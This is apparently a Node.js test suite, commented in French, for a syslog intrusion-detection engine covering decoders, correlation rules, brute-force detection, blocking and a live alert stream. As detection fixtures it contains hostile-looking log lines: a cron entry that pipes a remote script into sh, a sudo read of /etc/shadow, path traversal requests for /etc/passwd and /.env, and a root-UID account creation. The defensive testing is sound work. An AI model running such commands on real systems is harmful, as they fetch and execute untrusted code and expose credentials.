// La sentinelle : pré-décodage, décodeurs, arbre des règles, fenêtres de
// répétition, « après », première fois ; puis de bout en bout — une ligne de
// journal en syslog devient une alerte, un point du bouclier, un événement,
// et passe dans le flux en direct.
import { test, before, after } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import net from 'node:net';
import http from 'node:http';
import dgram from 'node:dgram';
import { Client } from '../socle/essai/client.js';
import { adminComplet } from '../socle/essai/inscription.js';
import { demarrer } from '../src/main.js';
import { predecoder } from '../src/sentinelle/predecodeur.js';
import { decoder, DECODEURS } from '../src/sentinelle/decodeurs.js';
import { REGLES, RACINES, ENFANTS, gravite } from '../src/sentinelle/regles.js';
import { Sentinelle } from '../src/sentinelle/moteur.js';

const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'sentinelle-'));
const silence = { info() {}, warn() {}, error() {} };
const attendre = ms => new Promise(r => setTimeout(r, ms));
const ATTAQUANT = '45.155.205.10';
after(() => fs.rmSync(tmp, { recursive: true, force: true }));

// ---------- pré-décodage ----------
test('pré-décodage : RFC 3164, RFC 5424, ISO, ligne nue, noyau', () => {
  const t = Date.UTC(2026, 9, 15, 12, 0, 0);
  let p = predecoder('<38>Oct 14 10:00:01 srv1 sshd[1234]: Failed password', { maintenant: t });
  assert.deepEqual([p.hote, p.programme, p.pid, p.message], ['srv1', 'sshd', 1234, 'Failed password']);
  assert.equal(new Date(p.quand).toISOString(), '2026-10-14T10:00:01.000Z');
  p = predecoder('<38>Dec 30 10:00:01 srv1 sshd: x', { maintenant: t });
  assert.equal(new Date(p.quand).getUTCFullYear(), 2025, 'un mois à venir sans année : l’an passé');
  p = predecoder('1 2026-10-14T10:00:01Z srv2 sshd 99 - - Accepted', { maintenant: t });
  assert.deepEqual([p.hote, p.programme, p.pid, p.message], ['srv2', 'sshd', 99, 'Accepted']);
  p = predecoder('2026-10-14T10:00:01+02:00 nas Connection: User', { maintenant: t });
  assert.deepEqual([p.hote, p.programme, p.message], ['nas', 'Connection', 'User']);
  p = predecoder('kernel: [  12.5] device eth0 entered promiscuous mode', { maintenant: t, emetteur: '10.9.1.3' });
  assert.deepEqual([p.hote, p.programme, p.message], ['10.9.1.3', 'kernel', 'device eth0 entered promiscuous mode']);
  p = predecoder('juste du texte', { maintenant: t });
  assert.deepEqual([p.hote, p.programme, p.message], ['', '', 'juste du texte']);
});

// ---------- décodeurs ----------
test('décodeurs : SSH, sudo, comptes, noyau, NAS, hyperviseur, web, repli', () => {
  const d = l => { const pre = predecoder(l, { maintenant: 0 }); return decoder(pre); };
  let x = d('<38>Oct 14 10:00:01 s sshd[1]: Failed password for invalid user admin from 203.0.113.7 port 51234 ssh2');
  assert.equal(x.geste, 'auth.invalide'); assert.deepEqual([x.champs.utilisateur, x.champs.srcip, x.champs.srcport], ['admin', '203.0.113.7', '51234']);
  x = d('<38>Oct 14 10:00:01 s sshd[1]: Accepted publickey for alice from 10.9.1.5 port 5 ssh2: ED25519 SHA256:abc');
  assert.equal(x.geste, 'auth.succes'); assert.equal(x.champs.methode, 'publickey');
  x = d('<86>Oct 14 10:00:01 s sudo:    alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/apt update');
  assert.equal(x.geste, 'priv.commande'); assert.deepEqual([x.champs.utilisateur, x.champs.cible, x.champs.commande], ['alice', 'root', '/usr/bin/apt update']);
  x = d('<86>Oct 14 10:00:01 s sudo:    mallory : user NOT in sudoers ; TTY=pts/1 ; PWD=/ ; USER=root ; COMMAND=/bin/cat /etc/shadow');
  assert.equal(x.geste, 'priv.echec'); assert.match(x.champs.raison, /NOT in sudoers/);
  x = d("<86>Oct 14 10:00:01 s usermod[9]: add 'bob' to group 'sudo'");
  assert.equal(x.geste, 'groupe.ajout'); assert.equal(x.champs.groupe, 'sudo');
  x = d('<86>Oct 14 10:00:01 s useradd[9]: new user: name=svc, UID=0, GID=0, home=/, shell=/bin/sh');
  assert.equal(x.geste, 'compte.cree'); assert.equal(x.champs.id, '0');
  x = d('<0>Oct 14 10:00:01 s kernel: [1.0] device eth0 entered promiscuous mode');
  assert.equal(x.geste, 'noyau.promiscuite'); assert.equal(x.champs.interface, 'eth0');
  x = d('<0>Oct 14 10:00:01 s kernel: TCP: Possible SYN flooding on port 443. Sending cookies.');
  assert.equal(x.geste, 'noyau.syn'); assert.equal(x.champs.dstport, '443');
  x = d('<30>Oct 14 10:00:01 nas Connection: User [admin] from [203.0.113.7] failed to log in via [DSM] due to authorization failure.');
  assert.equal(x.decodeur, 'synology'); assert.equal(x.geste, 'auth.echec'); assert.equal(x.champs.application, 'DSM');
  x = d('<30>Oct 14 10:00:01 pve pvedaemon[1]: authentication failure; rhost=10.9.1.9 user=root@pam msg=Authentication failure');
  assert.equal(x.decodeur, 'proxmox'); assert.equal(x.champs.utilisateur, 'root@pam');
  x = d('<30>Oct 14 10:00:01 w nginx: 203.0.113.8 - - [14/Oct/2026:10:00:01 +0000] "GET /../../etc/passwd HTTP/1.1" 404 153 "-" "curl/8"');
  assert.equal(x.geste, 'web.requete'); assert.deepEqual([x.champs.statut, x.champs.url], ['404', '/../../etc/passwd']);
  x = d('<30>Oct 14 10:00:01 s dockerd[5]: time="2026" level=info msg="container 9f8e7d6c5b4a3f2e died (exit code 137)"');
  assert.equal(x.geste, 'conteneur.mort'); assert.equal(x.champs.id, '9f8e7d6c5b4a3f2e');
  x = d('<30>Oct 14 10:00:01 s su[2]: pam_unix(su:session): session opened for user root(uid=0) by alice(uid=1000)');
  assert.equal(x.geste, 'session.ouverte'); assert.deepEqual([x.champs.cible, x.champs.utilisateur], ['root', 'alice']);
  x = d('<30>Oct 14 10:00:01 s inconnu: refused connection from 1.2.3.4 user=zed');
  assert.equal(x.decodeur, ''); assert.equal(x.geste, 'depot.texte'); assert.deepEqual([x.champs.srcip, x.champs.utilisateur], ['1.2.3.4', 'zed']);
  // Une IPv6 mappée se lit en IPv4.
  x = d('<38>Oct 14 10:00:01 s sshd[1]: Failed password for root from ::ffff:203.0.113.7 port 1 ssh2');
  assert.equal(x.champs.srcip, '203.0.113.7');
  for (const dec of DECODEURS) for (const m of dec.motifs) assert.ok(m.regex instanceof RegExp && m.geste, `${dec.nom} : motif complet`);
  // Wi-Fi : un refus 802.1X est un échec d'authentification, pas une association.
  x = d('<30>Oct 14 10:00:01 ap hostapd: wlan0: STA aa:bb:cc:dd:ee:ff IEEE 802.1X: authentication failed');
  assert.deepEqual([x.decodeur, x.geste, x.champs.mac], ['wifi', 'auth.echec', 'aa:bb:cc:dd:ee:ff']);
  x = d('<30>Oct 14 10:00:01 ap hostapd: wlan1: STA aa:bb:cc:dd:ee:ff IEEE 802.11: associated');
  assert.deepEqual([x.geste, x.champs.interface, x.champs.quoi], ['wifi.assoc', 'wlan1', 'associated']);
});

test('décodeurs : une ligne hostile de 16 Kio, quel que soit le programme annoncé, se lit vite', () => {
  // N'importe quel émetteur accepté écrit la ligne : une expression qui revient
  // en arrière sur toute sa longueur figerait VIGIE entière.
  const programmes = new Set(['', 'kernel', 'x']);
  for (const dec of DECODEURS) for (const p of String(dec.programme?.source || '').replace(/[\^$()?:]/g, ' ').split(/[|\s]+/)) if (/^[\w.-]+$/.test(p)) programmes.add(p);
  const morceaux = ['a', '1', '1.', ':', 'a:', ' ', 'from ', 'rhost=', '"', ';', 'COMMAND=', '/', '[', '::', 'ff:', '-', '|', '{"a":'];
  const s = new Sentinelle({ vus: { vu: () => false, noter: () => {} }, log: silence });
  let pire = { ms: 0 };
  for (const p of programmes) for (const m of morceaux) {
    const tete = `<13>Oct 19 12:00:00 hote ${p}${p ? '[1]: ' : ''}`;
    const ligne = (tete + m.repeat(Math.ceil(16384 / m.length))).slice(0, 16384);
    const t = performance.now(); s.traiter(ligne, { emetteur: '10.0.0.1', quand: 0 }); const ms = performance.now() - t;
    if (ms > pire.ms) pire = { ms, p, m };
  }
  assert.ok(pire.ms < 60, `ligne lue en ${pire.ms.toFixed(0)} ms (programme « ${pire.p} », motif ${JSON.stringify(pire.m)})`);
});

// ---------- règles ----------
test('règles : arbre cohérent, niveaux 0-15, gravités', () => {
  const ids = new Set();
  for (const r of REGLES) {
    assert.ok(!ids.has(r.id), `${r.id} en double`); ids.add(r.id);
    assert.ok(r.niveau >= 0 && r.niveau <= 15 && r.groupes.length && r.description, r.id);
    if (r.frequence) assert.ok(r.fenetre > 0 && r.si, `${r.id} : une règle de répétition précise sa parente et sa fenêtre`);
    if (r.apres) assert.ok((r.apres.regle || r.apres.groupe) && r.apres.fenetre, r.id);
  }
  assert.ok(RACINES.length > 20 && ENFANTS.size > 10);
  assert.deepEqual([gravite(0), gravite(6), gravite(7), gravite(10), gravite(13)], ['info', 'info', 'faible', 'eleve', 'critique']);
});

test('moteur : force brute, succès après force brute, hôte compromis, balayage web, première fois, silence', () => {
  let t = Date.UTC(2026, 9, 15, 10, 0, 0);
  const alertes = [], evenements = [];
  const s = new Sentinelle({ maintenant: () => t, surAlerte: a => alertes.push(a), surEvenement: e => evenements.push(e), log: silence });
  const L = l => s.traiter(l, { emetteur: '10.9.1.3' });
  const ids = () => alertes.map(a => a.regle);

  // Huit échecs de la même adresse en deux minutes → force brute, une seule fois (ignorer).
  for (let i = 0; i < 9; i++) { L(`<38>Oct 15 10:00:0${i % 10} srv1 sshd[1]: Failed password for root from ${ATTAQUANT} port ${50000 + i} ssh2`); t += 1000; }
  assert.deepEqual(ids(), ['ssh.echec-root', 'ssh.force-brute'], 'un échec admin signalé une fois par minute, puis la force brute');
  assert.equal(evenements.length, 9, 'chaque échec reste dans le flux');
  // Puis une connexion réussie de la même adresse : compte forcé (niveau 12), première fois vue aussi.
  const r = L(`<38>Oct 15 10:00:20 srv1 sshd[1]: Accepted password for root from ${ATTAQUANT} port 2 ssh2`);
  assert.equal(r.alerte.regle, 'ssh.succes-apres-force-brute'); assert.equal(r.alerte.niveau, 12);
  assert.ok(r.alerte.composees.includes('ssh.premiere-source'));
  // Sur cet hôte, un compte créé puis ajouté à sudo, une tâche planifiée suspecte, l'écoute du réseau.
  t += 30_000;
  assert.equal(L('<86>Oct 15 10:01:00 srv1 useradd[9]: new user: name=svc, UID=1004, GID=1004, home=/home/svc, shell=/bin/bash').alerte.regle, 'compte.cree-apres-intrusion');
  assert.equal(L("<86>Oct 15 10:01:01 srv1 usermod[9]: add 'svc' to group 'sudo'").alerte.niveau, 12);
  assert.equal(L('<30>Oct 15 10:01:02 srv1 CRON[7]: (root) CMD (curl -s http://x/y.sh | sh)').alerte.regle, 'planif.commande.suspecte');
  assert.equal(L('<0>Oct 15 10:01:03 srv1 kernel: device eth0 entered promiscuous mode').alerte.niveau, 13);
  // Un autre hôte, sans intrusion avant : le même compte créé reste niveau 8.
  assert.equal(L('<86>Oct 15 10:01:04 srv2 useradd[9]: new user: name=svc, UID=1004, GID=1004, home=/home/svc, shell=/bin/bash').alerte.niveau, 8);

  // Web : cinq URL d'attaque de la même adresse → outil de balayage.
  let web;
  for (let i = 0; i < 5; i++) { web = L(`<30>Oct 15 10:02:00 web nginx: 203.0.113.8 - - [15/Oct/2026:10:02:00 +0000] "GET /../../etc/passwd${i} HTTP/1.1" 404 1 "-" "x"`); t += 500; }
  assert.equal(web.alerte.regle, 'web.attaque.rafale');
  // Une traversée servie en 200 : niveau 12.
  assert.equal(L('<30>Oct 15 10:02:10 web nginx: 203.0.113.9 - - [15/Oct/2026:10:02:10 +0000] "GET /.env HTTP/1.1" 200 1 "-" "x"').alerte.niveau, 12);
  // Une requête ordinaire : silencieuse, ni événement ni alerte, mais l'hôte est compté.
  const ok = L('<30>Oct 15 10:02:11 web nginx: 10.9.1.4 - - [15/Oct/2026:10:02:11 +0000] "GET /index.html HTTP/1.1" 200 1 "-" "x"');
  assert.equal(ok.evenement, null); assert.equal(ok.alerte, null); assert.equal(ok.lue, true);
  assert.equal(s.hotes.get('web').lignes, 7);

  // NAS : neuf échecs puis un succès → auth.force-brute puis compte forcé.
  for (let i = 0; i < 9; i++) { L(`<30>Oct 15 10:03:00 nas Connection: User [admin] from [${ATTAQUANT}] failed to log in via [DSM] due to authorization failure.`); t += 1000; }
  assert.equal(L(`<30>Oct 15 10:03:10 nas Connection: User [admin] from [${ATTAQUANT}] logged in successfully via [DSM].`).alerte.regle, 'auth.succes-apres-force-brute');

  // Première fois : la deuxième connexion de la même adresse n'est plus « première ».
  assert.equal(L('<38>Oct 15 10:04:00 srv3 sshd[1]: Accepted publickey for alice from 10.9.1.5 port 5 ssh2').alerte.regle, 'ssh.premiere-source');
  assert.equal(L('<38>Oct 15 10:04:01 srv3 sshd[1]: Accepted publickey for alice from 10.9.1.5 port 6 ssh2').alerte, null, 'niveau 3 : sous le seuil');

  // Une ligne sans décodeur ni mot d'alerte : rien, pas même lue.
  assert.equal(L('<30>Oct 15 10:05:00 srv3 truc: tout va bien').lue, false);
  // Mais un programme qui crie à l'intrusion est entendu.
  assert.equal(L('<30>Oct 15 10:05:01 srv3 rkhunter: Warning: possible rootkit found').alerte.regle, 'texte.intrusion');

  const e = s.etat();
  assert.ok(e.stats.lignes > 30 && e.stats.alertes === alertes.length && e.hotes[0].hote === 'srv1' && e.hotes[0].niveauMax === 13);
  assert.ok(e.regles.find(x => x.id === 'ssh.echec').n >= 9);

  // Le banc d'essai ne retient rien et montre la chaîne.
  const avant = s.stats.lignes;
  const essai = s.essai(`<38>Oct 15 10:06:00 srv1 sshd[1]: Failed password for root from ${ATTAQUANT} port 1 ssh2`);
  assert.deepEqual(essai.chaine.map(x => x.id), ['ssh.echec', 'ssh.echec-root']);
  assert.ok(essai.composeesPossibles.some(x => x.id === 'ssh.force-brute'));
  assert.equal(essai.finale.id, 'ssh.echec-root');
  assert.equal(s.stats.lignes, avant);
});

test('moteur : les fenêtres et les silences restent bornés', () => {
  let t = 0;
  const s = new Sentinelle({ maintenant: () => t, log: silence });
  for (let i = 0; i < 25000; i++) { s.traiter(`<38>Oct 15 10:00:00 h sshd[1]: Failed password for u from 203.0.${(i >> 8) & 255}.${i & 255} port 1 ssh2`); t += 10; }
  assert.ok(s.fenetres.size <= 20000 && s.silences.size <= 20001);
  assert.ok(s.hotes.size === 1);
});

// ---------- de bout en bout ----------
const portLibre = () => new Promise(r => { const s = net.createServer().listen(0, '127.0.0.1', () => { const p = s.address().port; s.close(() => r(p)); }); });
const JETON_HUB = 'jeton-du-hub-pour-la-sentinelle-0123456789';
const INSTALL = 'jeton-d-installation-de-la-sentinelle';
let vigie, admin, portSyslog;
const avec = (jeton, methode, chemin, corps) => new Client(vigie.port).req(methode, chemin, corps, { entetes: { authorization: `Bearer ${jeton}` }, origine: null });

before(async () => {
  process.umask(0o077);
  portSyslog = await portLibre();
  vigie = await demarrer({ DATA_DIR: path.join(tmp, 'api'), PORT: '0', HOTE: '127.0.0.1', VIGIE_HUB_TOKEN: JETON_HUB, SOCLE_JETON_INSTALLATION: INSTALL, VIGIE_SYSLOG_PORT: String(portSyslog) }, { log: silence, fetchMenaces: async () => new Response('', { status: 404 }) });
  admin = new Client(vigie.port);
  await adminComplet(admin, { jeton: INSTALL });
});
after(async () => { await vigie?.arreter(); });

test('API : des journaux d’hôte en syslog deviennent alertes, événement, points du bouclier, et passent dans le flux', async () => {
  // Le flux en direct, ouvert avant que ça parle.
  const recu = [];
  const cookie = [...admin.cookies].map(([k, v]) => `${k}=${v}`).join('; ');
  const flux = await new Promise((ok, ko) => {
    const rq = http.get({ host: '127.0.0.1', port: vigie.port, path: '/api/sentinelle/flux', headers: { cookie, accept: 'text/event-stream' } }, res => { assert.equal(res.statusCode, 200); assert.match(res.headers['content-type'], /event-stream/); res.setEncoding('utf8'); res.on('data', d => recu.push(d)); ok({ rq, res }); });
    rq.on('error', ko);
  });
  assert.equal((await new Client(vigie.port).get('/api/sentinelle/flux')).status, 401, 'le flux demande une session');

  const u = dgram.createSocket('udp4');
  const envoyer = l => new Promise(r => u.send(l, portSyslog, '127.0.0.1', r));
  // Sans émetteur déclaré, une force brute lue en syslog est signalée, pas bloquée : n'importe quelle machine du réseau a pu l'écrire.
  for (let i = 0; i < 9; i++) await envoyer(`<38>Oct 15 09:00:0${i} srv0 sshd[1]: Failed password for root from 45.155.205.11 port ${50000 + i} ssh2`);
  for (let i = 0; i < 100 && vigie.bouclier.recepteur.stats.hotes < 9; i++) await attendre(10);
  await envoyer(`<38>Oct 15 09:00:20 srv0 sshd[1]: Accepted password for root from 45.155.205.11 port 2 ssh2`);
  let nv;
  for (let i = 0; i < 100; i++) { nv = (await admin.get('/api/evenements?type=bouclier.signalee')).json; if (nv.length) break; await attendre(10); }
  assert.ok(nv.some(x => x.sujet === '45.155.205.11'), 'signalée comme non vérifiée');
  assert.ok(!(await admin.get('/api/bouclier')).json.blocages.some(x => x.ip === '45.155.205.11'), 'pas bloquée');
  // La passerelle (ici la boucle locale) déclarée : ses journaux font foi.
  assert.equal((await admin.put('/api/reglages/bouclier', { emetteurs: ['127.0.0.1'] })).status, 200);

  for (let i = 0; i < 9; i++) await envoyer(`<38>Oct 15 10:00:0${i} srv1 sshd[1]: Failed password for root from ${ATTAQUANT} port ${50000 + i} ssh2`);
  await envoyer(`<38>Oct 15 10:00:20 srv1 sshd[1]: Accepted password for root from ${ATTAQUANT} port 2 ssh2`);
  await envoyer('<4>Oct 15 10:01:01 udm kernel: [WAN_IN-D-1] SRC=203.0.113.77 DST=203.0.113.5 PROTO=TCP SPT=1 DPT=22');
  for (let i = 0; i < 100 && vigie.bouclier.recepteur.stats.hotes < 20; i++) await attendre(10);
  // Le même hôte, vu depuis une adresse du réseau (le banc envoie en boucle locale, qui n'est pas « interne »).
  assert.equal(vigie.sentinelle.ligne('<86>Oct 15 10:01:00 srv1 useradd[9]: new user: name=svc, UID=1004, GID=1004, home=/home/svc, shell=/bin/bash', '10.9.1.3', Date.now()), true);
  let e;
  for (let i = 0; i < 100; i++) { e = (await admin.get('/api/sentinelle')).json; if (e.recentes.some(a => a.regle === 'compte.cree-apres-intrusion')) break; await attendre(10); }
  u.close();
  assert.ok(e.actif && e.nbRegles === REGLES.length && e.decodeurs.includes('sshd'));
  assert.ok(e.hotes.find(h => h.hote === 'srv1')?.niveauMax >= 13, JSON.stringify(e.hotes));
  const regles = e.recentes.map(a => a.regle);
  assert.ok(regles.includes('ssh.force-brute') && regles.includes('ssh.succes-apres-force-brute') && regles.includes('compte.cree-apres-intrusion'), regles.join(','));
  assert.ok(e.bilan.total >= 4 && e.bilan.parHote[0].hote === 'srv1');

  // Les alertes sont en base, filtrables ; les paramètres sont contrôlés.
  const a = await admin.get(`/api/sentinelle/alertes?niveau=10&srcip=${ATTAQUANT}`);
  assert.equal(a.status, 200); assert.ok(a.json.length >= 2 && a.json.every(x => x.niveau >= 10 && x.srcip === ATTAQUANT));
  assert.equal((await admin.get('/api/sentinelle/alertes?hote=../x')).status, 400);
  assert.equal((await avec(JETON_HUB, 'GET', '/api/sentinelle/regles')).status, 200, 'le Hub lit');
  assert.equal((await avec(JETON_HUB, 'GET', '/api/sentinelle/regles')).json.length, REGLES.length);

  // Le bouclier a pris les points : l'attaquant est au-dessus du seuil, l'hôte compromis est noté en interne.
  let b;
  for (let i = 0; i < 100; i++) { b = (await admin.get('/api/bouclier')).json; if (b.blocages.some(x => x.ip === ATTAQUANT)) break; await attendre(10); }
  assert.ok(b.blocages.some(x => x.ip === ATTAQUANT), 'force brute puis compte forcé : bloqué');
  assert.ok(b.internes.some(x => x.ip === '10.9.1.3'), 'l’hôte qui a envoyé les signes de compromission est suspect');
  assert.ok(b.syslog.hotes >= 10 && b.syslog.lues >= 1, JSON.stringify(b.syslog));

  // Un événement de VIGIE pour le niveau ≥ 10.
  const ev = (await admin.get('/api/evenements?type=sentinelle')).json;
  assert.ok(ev.some(x => x.titre.includes('compte probablement forcé')), ev.map(x => x.titre).join(' | '));
  assert.ok(ev.some(x => x.gravite === 'critique'));

  // Le flux a reçu la sentinelle et le bouclier.
  for (let i = 0; i < 100 && !recu.join('').includes('event: bouclier'); i++) await attendre(10);
  const texte = recu.join('');
  assert.ok(texte.includes('event: sentinelle') && texte.includes('"regle":"ssh.force-brute"') && texte.includes('event: bouclier'));
  flux.rq.destroy();

  // Réglages : seuil, corrélation ; l'essai de règle, réservé à l'administrateur.
  assert.equal((await avec(JETON_HUB, 'PUT', '/api/reglages/sentinelle', { seuil: 5 })).status, 403);
  const r = await admin.put('/api/reglages/sentinelle', { seuil: 9, correler: false });
  assert.equal(r.status, 200); assert.equal(r.json.seuil, 9); assert.equal(r.json.correler, false);
  assert.equal((await admin.get('/api/reglages')).json.sentinelle.seuil, 9);
  const es = await admin.post('/api/sentinelle/essai', { ligne: "<86>Oct 15 10:01:01 srv1 usermod[9]: add 'svc' to group 'sudo'" });
  assert.equal(es.status, 200); assert.equal(es.json.finale.id, 'groupe.ajout-admin'); assert.equal(es.json.decodage.champs.groupe, 'sudo');
  assert.equal((await admin.post('/api/sentinelle/essai', { ligne: '' })).status, 400);
  // Éteinte : les lignes ne sont plus lues.
  await admin.put('/api/reglages/sentinelle', { actif: false });
  assert.equal(vigie.sentinelle.ligne('<38>Oct 15 10:00:00 h sshd[1]: Failed password for root from 1.2.3.4 port 1 ssh2', '127.0.0.1', Date.now()), false);
});
